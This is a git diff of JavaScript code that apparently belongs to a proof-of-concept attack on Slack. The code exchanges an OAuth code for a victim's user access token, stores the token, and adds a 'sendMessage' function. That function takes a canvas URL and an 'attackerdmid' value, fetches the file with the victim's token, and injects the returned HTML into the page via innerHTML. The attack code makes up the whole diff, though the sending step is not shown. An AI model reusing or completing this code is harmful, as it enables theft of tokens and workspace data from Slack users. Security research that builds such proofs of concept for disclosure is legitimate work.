@@ -23,21 +23,23 @@ var id = "1021671975639.5437093442241";
 var code = document.location.href.split("?")[1].split("&")[0].split('=')[1];
 var data = "code="+code+"&client_id="+id+"&client_secret="+secret;
 
-/*var fetchObject = () => {
-    var fileid = document.getElementById("fileid").value;
+var sendMessage = () => {
+    var canvasURL = document.getElementById("canvasurl").value;
+    var fileid = canvasURL.split("/")[5]
+    var attackerdmid = document.getElementById('attackerdmid').value;
     var token = localStorage.getItem("token");
     fetch("https://slack.com/api/files.info?file="+fileid+"&token="+token).then(
         response => response.json()).then((json) => {
             document.getElementsByClassName("preview")[0].innerHTML = json["content_html"];
         })
-}*/
+}
 
 var getObject = () => {
     fetch("https://slack.com/api/oauth.v2.access",{method: "POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body: data}).then(
         response => response.json()
     ).then((json) => {
         console.log(json);
-        document.write(json["authed_user"]["access_token"])
+        // document.write(json["authed_user"]["access_token"])
         localStorage.setItem("token", json["authed_user"]["access_token"])
     });
 }
